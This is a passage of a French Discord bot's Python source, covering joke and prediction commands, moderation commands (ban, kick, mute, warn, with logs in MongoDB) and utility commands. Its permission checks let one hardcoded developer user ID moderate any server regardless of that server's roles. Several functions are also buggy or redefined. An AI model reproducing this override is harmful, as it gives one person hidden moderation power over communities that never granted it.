        "Loup de mer 🌊🐺" : "Un loup qui conquiert aussi bien les océans que la terre, fier et audacieux.",
        "Baleine 🐋" : "Majestueuse et bienveillante, elle nage dans les eaux profondes avec sagesse.",
        "Léopard 🐆" : "Vif et agile, il disparaît dans la jungle avant même qu'on ait pu le voir.",
        "Ours 🐻" : "Fort et protecteur, il défend son territoire sans hésiter.",
        "Cygne 🦢" : "Gracieux et élégant, il incarne la beauté dans la tranquillité.",
        "Chameau 🐫" : "Patient et résistant, il traverse les déserts sans jamais se fatiguer.",
        "Grizzly 🐻‍❄️" : "Imposant et puissant, il est le roi des forêts froides.",
        "Koala 🐨" : "Doux et calme, il passe sa vie à dormir dans les arbres.",
        "Panthère noire 🐆" : "Silencieuse et mystérieuse, elle frappe toujours quand on s'y attend le moins.",
        "Zèbre 🦓" : "Unique et surprenant, il se distingue dans la foule grâce à ses rayures.",
        "Éléphant 🐘" : "Sage et majestueux, il marche au rythme de sa propre grandeur.",
        "Croco 🐊" : "Implacable et rusé, il attend patiemment avant de bondir.",
        "Mouflon 🐏" : "Fort et tenace, il n'a pas peur de braver les montagnes.",
        "Perroquet 🦜" : "Coloré et bavard, il ne cesse jamais de répéter ce qu'il entend.",
        "Rhinocéros 🦏" : "Imposant et robuste, il se fraye un chemin à travers tout sur son passage.",
        "Bison 🦬" : "Solide et puissant, il traverse les prairies avec une énergie inébranlable."

    }

    totem, description = random.choice(list(animaux_totem.items()))

    embed = discord.Embed(
        title=f"🌿 Totem de {member.name} 🌿",
        description=f"**{totem}** : {description}",
        color=discord.Color.green()
    )
    embed.set_thumbnail(url=member.avatar.url if member.avatar else None)
    embed.set_footer(text=f"Commandé par {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)
    
@bot.command()
async def futur(ctx, user: discord.Member = None):
    if not user:
        user = ctx.author  # Si pas d’utilisateur mentionné, prendre l’auteur

    predicions = [
        "Dans 5 minutes, tu découvriras un trésor caché… mais il sera rempli de bonbons.",
        "L'année prochaine, tu feras une rencontre étonnante avec un extraterrestre qui adore les chats.",
        "Demain, tu auras une conversation intense avec un pigeon, et il te donnera un conseil de vie précieux.",
        "Un chat va te confier un secret qui changera le cours de ton existence… mais tu ne te souviendras pas de ce secret.",
        "Dans quelques jours, tu seras élu meilleur joueur de cache-cache, mais tu te cacheras dans une pièce vide.",
        "Lundi, tu rencontreras quelqu'un qui aime les licornes autant que toi. Vous deviendrez amis pour la vie.",
        "Dans un futur proche, tu réussiras à inventer un gâteau qui ne se mange pas, mais il sera étonnamment populaire.",
        "Bientôt, un mystérieux inconnu t'offrira un paquet cadeau. Il contiendra un élastique et une noix de coco.",
        "Dans un mois, tu vivras une aventure épique où tu devras résoudre un mystère impliquant des chaussettes perdues.",
        "Prochainement, tu seras récompensé pour avoir trouvé une solution révolutionnaire au problème de la pizza froide.",
        "Dans un futur lointain, tu seras le leader d'une civilisation intergalactique. Tes sujets seront principalement des pandas."
        "Dans 5 minutes, tu rencontreras un robot qui te demandera comment faire des pancakes… mais il n'a pas de mains.",
        "Ce week-end, tu seras choisi pour participer à un concours de danse avec des flamants roses, mais tu devras danser sans musique.",
        "Demain, un magicien te proposera un vœu… mais il te le refusera en te montrant un tour de cartes.",
        "Un perroquet va te confier un secret très important, mais tu l'oublieras dès que tu entras dans une pièce.",
        "Dans quelques jours, tu découvriras un trésor enfoui sous ta maison… mais il sera composé uniquement de petites pierres colorées.",
        "Prochainement, tu feras une rencontre étrange avec un extraterrestre qui te demandera de lui apprendre à jouer aux échecs.",
        "Dans un futur proche, tu gagneras un prix prestigieux pour avoir créé un objet du quotidien, mais personne ne saura vraiment à quoi il sert.",
        "Bientôt, tu recevras une invitation pour un dîner chez des créatures invisibles. Le menu ? Des nuages et des rayons de lune.",
        "Dans un mois, tu seras choisi pour représenter ton pays dans un concours de chant… mais tu devras chanter sous l'eau.",
        "Dans un futur lointain, tu seras une légende vivante, reconnu pour avoir inventé la première machine à fabriquer des sourires."
        "Dans 5 minutes, tu verras un nuage prendre la forme de ton visage, mais il te fera une grimace étrange.",
        "Demain, tu seras invité à une réunion secrète de licornes qui discuteront des nouvelles tendances en matière de paillettes.",
        "Prochainement, un dauphin te confiera un message codé que tu devras résoudre… mais il sera écrit en chantant.",
        "Un dragon viendra te rendre visite et te proposera de partager son trésor… mais il s’avère que ce trésor est un stock infini de bonbons à la menthe.",
        "Dans quelques jours, tu apprendras à parler couramment le langage des grenouilles, mais seulement quand il pleut.",
        "Cette semaine, un voleur masqué viendra te voler une chaussette… mais il te laissera un billet pour un concert de musique classique.",
        "Prochainement, un fantôme te demandera de l'aider à retrouver ses clés perdues… mais tu découvriras qu'il a oublié où il les a mises.",
        "Dans un futur proche, tu seras élu président d'un club de fans de légumes, et tu recevras une médaille en forme de carotte.",
        "Bientôt, tu découvriras un raccourci secret qui te permettra de voyager dans des mondes parallèles… mais il te fera revenir à ton point de départ.",
        "Dans un mois, tu recevras une lettre d'invitation à un bal masqué organisé par des robots, mais tu ne pourras pas danser car tu porteras des chaussons trop grands."

    ]

    prediction = random.choice(predicions)

    embed = discord.Embed(
        title=f"🔮 Prédiction pour {user.name} 🔮",
        description=f"**Prédiction :**\n\n{prediction}",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"Le futur est incertain… mais amusant ! {ctx.author.name} |♥️by Iseyg", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

# Liste de blagues
blagues = [
    "Pourquoi les plongeurs plongent toujours en arrière et jamais en avant ? ||Parce que sinon ils tombent toujours dans le bateau.||",
    "Pourquoi les canards sont toujours à l'heure ? ||Parce qu'ils sont dans les starting-quack !||",
    "Quel est le comble pour un électricien ? ||De ne pas être au courant.||",
    "Pourquoi les maths sont tristes ? ||Parce qu'elles ont trop de problèmes.||",
    "Que dit une imprimante à une autre imprimante ? *||'T'as du papier ?'||",
    "Pourquoi les poissons détestent l'ordinateur ? ||Parce qu'ils ont peur du net !||",
    "Comment appelle-t-on un chat qui a perdu son GPS ? ||Un chat égaré.||",
    "Pourquoi les squelettes ne se battent-ils jamais entre eux ? ||Parce qu'ils n'ont pas de cœur !||",
    "Quel est le comble pour un plombier ? ||D'avoir un tuyau percé.||",
    "Comment appelle-t-on un chien magique ? ||Un labra-cadabra !||"
]

# Commande !blague
@bot.command()
async def blague(ctx):
    # Choisir une blague au hasard
    blague_choisie = random.choice(blagues)
    # Envoyer la blague dans le salon
    await ctx.send(blague_choisie)

#------------------------------------------------------------------------- Commandes de Moderation : +ban, +unban, +mute, +unmute, +kick, +warn

# 🎨 Fonction pour créer un embed formaté
def create_embed(title, description, color, ctx, member=None, action=None, reason=None, duration=None):
    embed = discord.Embed(title=title, description=description, color=color, timestamp=ctx.message.created_at)
    embed.set_footer(text=f"Action effectuée par {ctx.author.name}", icon_url=ctx.author.avatar.url)
    
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)

    if member:
        embed.add_field(name="👤 Membre sanctionné", value=member.mention, inline=True)
    if action:
        embed.add_field(name="⚖️ Sanction", value=action, inline=True)
    if reason:
        embed.add_field(name="📜 Raison", value=reason, inline=False)
    if duration:
        embed.add_field(name="⏳ Durée", value=duration, inline=True)

    return embed

# 🎯 Vérification des permissions et hiérarchie
def has_permission(ctx, perm):
    return ctx.author.id == ISEY_ID or getattr(ctx.author.guild_permissions, perm, False)

def is_higher_or_equal(ctx, member):
    return member.top_role >= ctx.author.top_role

# 📩 Envoi d'un log
async def send_log(ctx, member, action, reason, duration=None):
    guild_id = ctx.guild.id
    settings = GUILD_SETTINGS.get(guild_id, {})
    log_channel_id = settings.get("sanctions_channel")

    if log_channel_id:
        log_channel = bot.get_channel(log_channel_id)
        if log_channel:
            embed = create_embed("🚨 Sanction appliquée", f"{member.mention} a été sanctionné.", discord.Color.red(), ctx, member, action, reason, duration)
            await log_channel.send(embed=embed)

# 📩 Envoi d'un message privé à l'utilisateur sanctionné
async def send_dm(member, action, reason, duration=None):
    try:
        embed = create_embed("🚨 Vous avez reçu une sanction", "Consultez les détails ci-dessous.", discord.Color.red(), member, member, action, reason, duration)
        await member.send(embed=embed)
    except discord.Forbidden:
        print(f"Impossible d'envoyer un DM à {member.display_name}.")

@bot.hybrid_command(
    name="ban",
    description="Bannit un membre du serveur avec une raison optionnelle."
)
async def ban(ctx, member: discord.Member = None, *, reason="Aucune raison spécifiée"):
    if member is None:
        return await ctx.send("❌ Il manque un argument : vous devez mentionner un membre ou fournir un ID pour bannir.")

    # Si le membre fourni est une mention
    if isinstance(member, discord.Member):
        target_member = member
    else:
        # Si le membre est un ID
        target_member = get(ctx.guild.members, id=int(member))

    # Si le membre est introuvable dans le serveur
    if target_member is None:
        return await ctx.send("❌ Aucun membre trouvé avec cet ID ou mention.")

    if ctx.author == target_member:
        return await ctx.send("🚫 Vous ne pouvez pas vous bannir vous-même.")
    
    if is_higher_or_equal(ctx, target_member):
        return await ctx.send("🚫 Vous ne pouvez pas sanctionner quelqu'un de votre niveau ou supérieur.")
    
    if has_permission(ctx, "ban_members"):
        await member.ban(reason=reason)
        embed = create_embed("🔨 Ban", f"{member.mention} a été banni.", discord.Color.red(), ctx, member, "Ban", reason)
        await ctx.send(embed=embed)
        await send_log(ctx, member, "Ban", reason)
        await send_dm(member, "Ban", reason)

        # Enregistrement de la sanction
        add_sanction(ctx.guild.id, member.id, "Ban", reason)

@bot.hybrid_command(
    name="unban",
    description="Débannit un utilisateur du serveur à partir de son ID."
)
async def unban(ctx, user_id: int = None):
    if user_id is None:
        return await ctx.send("❌ Il manque un argument : vous devez spécifier l'ID d'un utilisateur à débannir.")

    if has_permission(ctx, "ban_members"):
        try:
            user = await bot.fetch_user(user_id)
            await ctx.guild.unban(user)
            embed = create_embed("🔓 Unban", f"{user.mention} a été débanni.", discord.Color.green(), ctx, user, "Unban", "Réintégration")
            await ctx.send(embed=embed)
            await send_log(ctx, user, "Unban", "Réintégration")
            await send_dm(user, "Unban", "Réintégration")
        except discord.NotFound:
            return await ctx.send("❌ Aucun utilisateur trouvé avec cet ID.")
        except discord.Forbidden:
            return await ctx.send("❌ Je n'ai pas les permissions nécessaires pour débannir cet utilisateur.")


@bot.hybrid_command(
    name="kick",
    description="Expulse un membre du serveur avec une raison optionnelle."
)
async def kick(ctx, member: discord.Member = None, *, reason="Aucune raison spécifiée"):
    if member is None:
        return await ctx.send("❌ Il manque un argument : vous devez mentionner un membre à expulser.")

    if ctx.author == member:
        return await ctx.send("🚫 Vous ne pouvez pas vous expulser vous-même.")
    if is_higher_or_equal(ctx, member):
        return await ctx.send("🚫 Vous ne pouvez pas sanctionner quelqu'un de votre niveau ou supérieur.")
    if has_permission(ctx, "kick_members"):
        await member.kick(reason=reason)
        embed = create_embed("👢 Kick", f"{member.mention} a été expulsé.", discord.Color.orange(), ctx, member, "Kick", reason)
        await ctx.send(embed=embed)
        await send_log(ctx, member, "Kick", reason)
        await send_dm(member, "Kick", reason)

@bot.hybrid_command(
    name="mute",
    description="Mute temporairement un membre (timeout) avec une durée spécifiée."
)
async def mute(ctx, member: discord.Member = None, duration_with_unit: str = None, *, reason="Aucune raison spécifiée"):
    if member is None:
        return await ctx.send("❌ Il manque un argument : vous devez mentionner un membre à mute.")
    
    if duration_with_unit is None:
        return await ctx.send("❌ Il manque un argument : vous devez préciser une durée (ex: `10m`, `1h`, `2j`).")

    if ctx.author == member:
        return await ctx.send("🚫 Vous ne pouvez pas vous mute vous-même.")
    if is_higher_or_equal(ctx, member):
        return await ctx.send("🚫 Vous ne pouvez pas sanctionner quelqu'un de votre niveau ou supérieur.")
    if not has_permission(ctx, "moderate_members"):
        return await ctx.send("❌ Vous n'avez pas la permission de mute des membres.")
    
    # Vérification si le membre est déjà en timeout
    if member.timed_out:
        return await ctx.send(f"❌ {member.mention} est déjà en timeout.")
    
    # Traitement de la durée
    time_units = {"m": "minutes", "h": "heures", "j": "jours"}
    try:
        duration = int(duration_with_unit[:-1])
        unit = duration_with_unit[-1].lower()
        if unit not in time_units:
            raise ValueError
    except ValueError:
        return await ctx.send("❌ Format invalide ! Utilisez un nombre suivi de `m` (minutes), `h` (heures) ou `j` (jours).")

    # Calcul de la durée
    time_deltas = {"m": timedelta(minutes=duration), "h": timedelta(hours=duration), "j": timedelta(days=duration)}
    duration_time = time_deltas[unit]

    try:
        # Tente de mettre le membre en timeout
        await member.timeout(duration_time, reason=reason)
        duration_str = f"{duration} {time_units[unit]}"
        
        # Embeds et réponses
        embed = create_embed("⏳ Mute", f"{member.mention} a été muté pour {duration_str}.", discord.Color.blue(), ctx, member, "Mute", reason, duration_str)
        await ctx.send(embed=embed)
        await send_log(ctx, member, "Mute", reason, duration_str)
        await send_dm(member, "Mute", reason, duration_str)

        # Ajout des sanctions dans la base de données MongoDB
        sanction_data = {
            "guild_id": str(ctx.guild.id),
            "user_id": str(member.id),
            "action": "Mute",
            "reason": reason,
            "duration": duration_str,
            "timestamp": datetime.utcnow()
        }
        collection7.insert_one(sanction_data)  # collection7 est la collection de sanctions
        
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission de mute ce membre. Vérifiez les permissions du bot.")
    except discord.HTTPException as e:
        await ctx.send(f"❌ Une erreur s'est produite lors de l'application du mute : {e}")
    except Exception as e:
        await ctx.send(f"❌ Une erreur inattendue s'est produite : {str(e)}")

@bot.hybrid_command(
    name="unmute",
    description="Retire le mute d'un membre (timeout)."
)
async def unmute(ctx, member: discord.Member = None):
    if member is None:
        return await ctx.send("❌ Il manque un argument : vous devez mentionner un membre à démuter.")

    if has_permission(ctx, "moderate_members"):
        await member.timeout(None)
        embed = create_embed("🔊 Unmute", f"{member.mention} a été démuté.", discord.Color.green(), ctx, member, "Unmute", "Fin du mute")
        await ctx.send(embed=embed)
        await send_log(ctx, member, "Unmute", "Fin du mute")
        await send_dm(member, "Unmute", "Fin du mute")

# Fonction de vérification des permissions
async def check_permissions(ctx):
    # Vérifier si l'utilisateur a la permission "Manage Messages"
    return ctx.author.guild_permissions.manage_messages or ctx.author.id == 1166334752186433567

# Fonction pour vérifier si le membre est immunisé
async def is_immune(member):
    # Exemple de logique d'immunité (peut être ajustée)
    # Vérifie si le membre a un rôle spécifique ou une permission
    return any(role.name == "Immunité" for role in member.roles)

# Fonction pour envoyer un message de log
async def send_log(ctx, member, action, reason):
    log_channel = discord.utils.get(ctx.guild.text_channels, name="logs")  # Remplacer par le salon de log approprié
    if log_channel:
        embed = discord.Embed(
            title="Avertissement",
            description=f"**Membre :** {member.mention}\n**Action :** {action}\n**Raison :** {reason}",
            color=discord.Color.orange()
        )
        embed.set_footer(text=f"Avertissement donné par {ctx.author}", icon_url=ctx.author.avatar.url)
        await log_channel.send(embed=embed)

# Fonction pour envoyer un message en DM au membre
async def send_dm(member, action, reason):
    try:
        embed = discord.Embed(
            title="⚠️ Avertissement",
            description=f"**Action :** {action}\n**Raison :** {reason}",
            color=discord.Color.red()
        )
        embed.set_footer(text="N'oublie pas de respecter les règles !")
        await member.send(embed=embed)
    except discord.Forbidden:
        print(f"Impossible d'envoyer un message privé à {member.name}")

@bot.hybrid_command(
    name="warn",
    description="Avertit un membre avec une raison optionnelle."
)
async def warn(ctx, member: discord.Member = None, *, reason="Aucune raison spécifiée"):
    if member is None:
        return await ctx.send("❌ Il manque un argument : vous devez mentionner un membre à avertir.")

    if ctx.author == member:
        return await ctx.send("🚫 Vous ne pouvez pas vous avertir vous-même.")
    
    if is_higher_or_equal(ctx, member):
        return await ctx.send("🚫 Vous ne pouvez pas avertir quelqu'un de votre niveau ou supérieur.")
    
    if not has_permission(ctx, "moderate_members"):
        return await ctx.send("❌ Vous n'avez pas la permission de donner des avertissements.")
    
    try:
        # Ajout du warning à la base de données
        sanction_data = {
            "guild_id": str(ctx.guild.id),
            "user_id": str(member.id),
            "action": "Warn",
            "reason": reason,
            "timestamp": datetime.utcnow()
        }

        # Tentative d'insertion dans MongoDB
        collection7.insert_one(sanction_data)
        print(f"Sanction ajoutée à la base de données pour {member.mention}")

        # Embeds et réponses
        embed = create_embed("⚠️ Avertissement donné", f"{member.mention} a reçu un avertissement pour la raison suivante :\n{reason}", discord.Color.orange(), ctx, member, "Avertissement", reason)
        await ctx.send(embed=embed)
        await send_log(ctx, member, "Warn", reason)
        await send_dm(member, "Avertissement", reason)

    except Exception as e:
        # Log de l'erreur dans la console pour faciliter le débogage
        print(f"Erreur lors de l'exécution de la commande warn : {e}")
        await ctx.send(f"❌ Une erreur s'est produite lors de l'exécution de la commande. Détails : {str(e)}")

@bot.hybrid_command(
    name="warnlist",
    description="Affiche la liste des avertissements d’un membre."
)
async def warnlist(ctx, member: discord.Member = None):
    if member is None:
        return await ctx.send("❌ Il manque un argument : vous devez mentionner un membre.")
    
    sanctions = collection7.find({
        "guild_id": str(ctx.guild.id),
        "user_id": str(member.id),
        "action": "Warn"
    })

    count = collection7.count_documents({
        "guild_id": str(ctx.guild.id),
        "user_id": str(member.id),
        "action": "Warn"
    })

    if count == 0:
        return await ctx.send(f"✅ {member.mention} n'a aucun avertissement.")

    embed = discord.Embed(title=f"Avertissements de {member.name}", color=discord.Color.orange())
    for sanction in sanctions:
        date = sanction["timestamp"].strftime("%d/%m/%Y à %Hh%M")
        embed.add_field(name=f"Le {date}", value=sanction["reason"], inline=False)

    await ctx.send(embed=embed)

@bot.hybrid_command(
    name="unwarn",
    description="Supprime un avertissement d’un membre à partir de son index dans la warnlist."
)
async def unwarn(ctx, member: discord.Member = None, index: int = None):
    if member is None or index is None:
        return await ctx.send("❌ Utilisation : `/unwarn <membre> <index>`.")

    if not has_permission(ctx, "moderate_members"):
        return await ctx.send("❌ Vous n'avez pas la permission de retirer des avertissements.")

    # Récupère les avertissements du membre
    warnings = list(collection7.find({
        "guild_id": str(ctx.guild.id),
        "user_id": str(member.id),
        "action": "Warn"
    }).sort("timestamp", 1))

    if len(warnings) == 0:
        return await ctx.send(f"✅ {member.mention} n'a aucun avertissement.")

    if index < 1 or index > len(warnings):
        return await ctx.send(f"❌ Index invalide. Ce membre a {len(warnings)} avertissement(s).")

    try:
        to_delete = warnings[index - 1]
        collection7.delete_one({"_id": to_delete["_id"]})

        embed = create_embed(
            "✅ Avertissement retiré",
            f"L’avertissement n°{index} de {member.mention} a été supprimé.",
            discord.Color.green(),
            ctx,
            member,
            "Unwarn",
            to_delete["reason"]
        )

        await ctx.send(embed=embed)
        await send_log(ctx, member, "Unwarn", to_delete["reason"])
        await send_dm(member, "Unwarn", f"Ton avertissement datant du {to_delete['timestamp'].strftime('%d/%m/%Y à %Hh%M')} a été retiré.")
    
    except Exception as e:
        print(f"Erreur lors de l'exécution de la commande unwarn : {e}")
        await ctx.send(f"❌ Une erreur s'est produite lors de la suppression de l'avertissement. Détails : {str(e)}")

#------------------------------------------------------------------------- Commandes Utilitaires : +vc, +alerte, +uptime, +ping, +roleinfo

# Fonction pour récupérer les paramètres d'alerte
def get_alert_settings(guild_id: int):
    alerte_data = collection26.find_one({"guild_id": guild_id})  # Utilisation de int pour la cohérence
    if alerte_data:
        return alerte_data.get("alerts_channel_id"), alerte_data.get("ping_role_id")
    return None, None

# Commande slash pour configurer les alertes
@bot.tree.command(name="set_alerte", description="Configure les alertes pour ce serveur.")
@app_commands.describe(alerts_channel="Le canal où les alertes seront envoyées.", ping_role="Le rôle à mentionner lors des alertes.")
async def set_alerte(interaction: discord.Interaction, alerts_channel: discord.TextChannel, ping_role: discord.Role):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("Vous n'avez pas les permissions nécessaires pour configurer les alertes.", ephemeral=True)
        return

    collection26.update_one(
        {"guild_id": interaction.guild.id},  # Stocké en int
        {"$set": {
            "alerts_channel_id": alerts_channel.id,
            "ping_role_id": ping_role.id
        }},
        upsert=True
    )

    await interaction.response.send_message(f"✅ Configuration des alertes mise à jour :\n📢 Canal : {alerts_channel.mention}\n📌 Rôle : {ping_role.mention}")

# Commande prefix pour envoyer une alerte
@bot.command()
async def alerte(ctx, member: discord.Member, *, reason: str):
    alerts_channel_id, ping_role_id = get_alert_settings(ctx.guild.id)

    if not alerts_channel_id or not ping_role_id:
        await ctx.send("⚠️ La configuration des alertes est manquante. Utilisez `/set_alerte` pour la configurer.")
        return

    ping_role = ctx.guild.get_role(int(ping_role_id))
    alerts_channel = bot.get_channel(int(alerts_channel_id))

    if not ping_role:
        await ctx.send("⚠️ Le rôle mentionné pour les alertes est introuvable.")
        return
    if not alerts_channel:
        await ctx.send("⚠️ Le salon d'alertes est introuvable.")
        return

    alert_message = f"<@&{ping_role_id}>\n📢 Alerte émise par {ctx.author.mention}: {member.mention} - Raison : {reason}"

    try:
        await alerts_channel.send(alert_message)
    except discord.DiscordException as e:
        await ctx.send(f"❌ Erreur lors de l'envoi de l'alerte : {e}")
        return

    embed = discord.Embed(
        title="🚨 Alerte Émise 🚨",
        description=f"**Utilisateur:** {member.mention}\n**Raison:** {reason}",
        color=0xff0000
    )
    embed.set_thumbnail(url="https://example.com/alert_icon.png")  # Remplace cette URL si tu veux une autre icône
    embed.add_field(name="Alerte émise par", value=ctx.author.mention, inline=False)
    embed.add_field(name="Membre mentionné", value=member.mention, inline=False)
    embed.add_field(name="Raison de l'alerte", value=f"**{reason}**", inline=False)

    avatar_url = ctx.author.avatar.url if ctx.author.avatar else "https://discord.com/assets/2c21aeda6b5d1fd8f6dcf6d1f7e0f96b.png"
    embed.set_footer(text=f"Commandé par {ctx.author.name}", icon_url=avatar_url)

    try:
        await alerts_channel.send(embed=embed)
    except discord.DiscordException as e:
        await ctx.send(f"❌ Erreur lors de l'envoi de l'embed : {e}")
        return

    await ctx.send(f"✅ Alerte envoyée pour {member.mention} avec la raison : {reason}")


sent_embed_channels = {}

@bot.command()
async def vc(ctx):
    print("Commande 'vc' appelée.")

    try:
        guild = ctx.guild
        print(f"Guild récupérée: {guild.name} (ID: {guild.id})")

        total_members = guild.member_count
        online_members = sum(1 for member in guild.members if member.status != discord.Status.offline)
        voice_members = sum(len(voice_channel.members) for voice_channel in guild.voice_channels)
        boosts = guild.premium_subscription_count or 0
        owner_member = guild.owner
        verification_level = guild.verification_level.name
        text_channels = len(guild.text_channels)
        voice_channels = len(guild.voice_channels)
        server_created_at = guild.created_at.strftime('%d %B %Y')

        # Récupérer ou créer un lien d'invitation pour le serveur
        invites = await guild.invites()
        if invites:
            server_invite = invites[0].url  # Utilise le premier lien d'invitation trouvé
        else:
            # Crée une nouvelle invitation valide pendant 24h
            server_invite = await guild.text_channels[0].create_invite(max_age=86400)  # 86400 secondes = 24 heures

        embed = discord.Embed(title=f"📊 Statistiques de {guild.name}", color=discord.Color.purple())

        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)

        embed.add_field(name="👥 Membres", value=f"**{total_members}**", inline=True)
        embed.add_field(name="🟢 Membres en ligne", value=f"**{online_members}**", inline=True)
        embed.add_field(name="🎙️ En vocal", value=f"**{voice_members}**", inline=True)
        embed.add_field(name="💎 Boosts", value=f"**{boosts}**", inline=True)

        embed.add_field(name="👑 Propriétaire", value=f"<@{owner_member.id}>", inline=True)
        embed.add_field(name="🔒 Niveau de vérification", value=f"**{verification_level}**", inline=True)
        embed.add_field(name="📝 Canaux textuels", value=f"**{text_channels}**", inline=True)
        embed.add_field(name="🔊 Canaux vocaux", value=f"**{voice_channels}**", inline=True)
        embed.add_field(name="📅 Créé le", value=f"**{server_created_at}**", inline=False)
        embed.add_field(name="🔗 Lien du serveur", value=f"[{guild.name}]({server_invite})", inline=False)

        embed.set_footer(text="📈 Statistiques mises à jour en temps réel | ♥️ by Iseyg")

        await ctx.send(embed=embed)
        print("Embed envoyé avec succès.")

    except Exception as e:
        print(f"Erreur lors de l'exécution de la commande 'vc': {e}")
        await ctx.send("Une erreur est survenue lors de l'exécution de la commande.")
        return  # Empêche l'exécution du reste du code après une erreur


@bot.hybrid_command(
    name="ping",
    description="Affiche le Ping du bot."
)
async def ping(ctx):
    latency = round(bot.latency * 1000)  # Latence en ms
    embed = discord.Embed(title="Pong!", description=f"Latence: {latency}ms", color=discord.Color.green())

    await ctx.send(embed=embed)

@bot.tree.command(name="info-rôle", description="Obtenez des informations détaillées sur un rôle")
async def roleinfo(interaction: discord.Interaction, role: discord.Role):
    # Vérifier si le rôle existe
    if role is None:
        embed = discord.Embed(title="Erreur", description="Rôle introuvable.", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return
    else:
        # Obtenir tous les rôles triés du plus haut au plus bas
        sorted_roles = sorted(interaction.guild.roles, key=lambda r: r.position, reverse=True)
        total_roles = len(sorted_roles)
        
        # Trouver la position inversée du rôle
        inverse_position = total_roles - sorted_roles.index(role)

        embed = discord.Embed(
            title=f"Informations sur le rôle: {role.name}",
            color=role.color,
            timestamp=interaction.created_at
        )
        
        embed.set_thumbnail(url=interaction.guild.icon.url)
        embed.add_field(name="ID", value=role.id, inline=False)
        embed.add_field(name="Couleur", value=str(role.color), inline=False)
        embed.add_field(name="Nombre de membres", value=len(role.members), inline=False)
        embed.add_field(name="Position dans la hiérarchie", value=f"{inverse_position}/{total_roles}", inline=False)
        embed.add_field(name="Mentionnable", value=role.mentionable, inline=False)
        embed.add_field(name="Gérer les permissions", value=role.managed, inline=False)
        embed.add_field(name="Créé le", value=role.created_at.strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
        embed.add_field(name="Mention", value=role.mention, inline=False)

        embed.set_footer(text=f"Commande demandée par {interaction.user.name}", icon_url=interaction.user.avatar.url)

        await interaction.response.send_message(embed=embed)

@bot.hybrid_command(
    name="uptime",
    description="Affiche l'uptime du bot."
)
async def uptime(ctx):
    uptime_seconds = round(time.time() - start_time)
    days = uptime_seconds // (24 * 3600)
    hours = (uptime_seconds % (24 * 3600)) // 3600
    minutes = (uptime_seconds % 3600) // 60
    seconds = uptime_seconds % 60
    embed = discord.Embed(
        title="Uptime du bot",
        description=f"Le bot est en ligne depuis : {days} jours, {hours} heures, {minutes} minutes, {seconds} secondes",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"♥️by Iseyg", icon_url=ctx.author.avatar.url)
    await ctx.send(embed=embed)

@bot.tree.command(name="calcul", description="Effectue une opération mathématique")
@app_commands.describe(nombre1="Le premier nombre", operation="L'opération à effectuer (+, -, *, /)", nombre2="Le deuxième nombre")
async def calcul(interaction: discord.Interaction, nombre1: float, operation: str, nombre2: float):
    await interaction.response.defer()  # ✅ Correctement placé à l'intérieur de la fonction

    if operation == "+":
        resultat = nombre1 + nombre2
    elif operation == "-":
        resultat = nombre1 - nombre2
    elif operation == "*":
        resultat = nombre1 * nombre2
    elif operation == "/":
        if nombre2 != 0:
            resultat = nombre1 / nombre2
        else:
            await interaction.followup.send("❌ Erreur : Division par zéro impossible.")
            return
    else:
        await interaction.followup.send("❌ Opération invalide. Utilisez '+', '-', '*', ou '/'.")
        return

    embed = discord.Embed(
        title="📊 Résultat du calcul",
        description=f"{nombre1} {operation} {nombre2} = **{resultat}**",
        color=discord.Color.green()
    )

    await interaction.followup.send(embed=embed)

@bot.tree.command(name="calcul_pourcentage", description="Calcule un pourcentage d'un nombre")
@app_commands.describe(nombre="Le nombre de base", pourcentage="Le pourcentage à appliquer (ex: 15 pour 15%)")
async def calcul(interaction: discord.Interaction, nombre: float, pourcentage: float):
    await interaction.response.defer()  # ✅ Correctement placé à l'intérieur de la fonction

    resultat = (nombre * pourcentage) / 100
    embed = discord.Embed(
        title="📊 Calcul de pourcentage",
        description=f"{pourcentage}% de {nombre} = **{resultat}**",
        color=discord.Color.green()
    )

    await interaction.followup.send(embed=embed)

# Installer PyNaCl 
try:
    import nacl
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "PyNaCl"])

#------------------------------------------------------------------------- Commande Voice : /connect, /disconnect
# Commande /connect
@bot.tree.command(name="connect", description="Connecte le bot à un salon vocal spécifié.")
@app_commands.describe(channel="Choisissez un salon vocal où connecter le bot")
@commands.has_permissions(administrator=True)
async def connect(interaction: discord.Interaction, channel: discord.VoiceChannel):
    try:
        if not interaction.guild.voice_client:
            await channel.connect()
            embed = discord.Embed(
                title="✅ Connexion réussie !",
                description=f"Le bot a rejoint **{channel.name}**.",
                color=discord.Color.green()
            )
            await interaction.response.send_message(embed=embed)
        else:
            embed = discord.Embed(
                title="⚠️ Déjà connecté",
                description="Le bot est déjà dans un salon vocal.",
                color=discord.Color.orange()
            )
            await interaction.response.send_message(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="❌ Erreur",
            description=f"Une erreur est survenue : `{e}`",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)

# Commande /disconnect
@bot.tree.command(name="disconnect", description="Déconnecte le bot du salon vocal.")
@commands.has_permissions(administrator=True)
async def disconnect(interaction: discord.Interaction):
    if interaction.guild.voice_client:
        await interaction.guild.voice_client.disconnect()
        embed = discord.Embed(
            title="🚫 Déconnexion réussie",
            description="Le bot a quitté le salon vocal.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)
    else:
        embed = discord.Embed(
            title="⚠️ Pas connecté",
            description="Le bot n'est dans aucun salon vocal.",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed)
#------------------------------------------------------------------------------------------

# Commande pour ajouter une idée (sans restriction d'administrateur)
@bot.tree.command(name="idée", description="Rajoute une idée dans la liste")
async def ajouter_idee(interaction: discord.Interaction, idee: str):
    user_id = interaction.user.id  # Utilisation de interaction.user.id pour obtenir l'ID utilisateur
    
    # Vérifier si l'utilisateur a déjà des idées dans la base de données
    idees_data = collection8.find_one({"user_id": str(user_id)})
    
    if idees_data:
        # Si des idées existent déjà, on ajoute l'idée à la liste existante
        collection8.update_one(
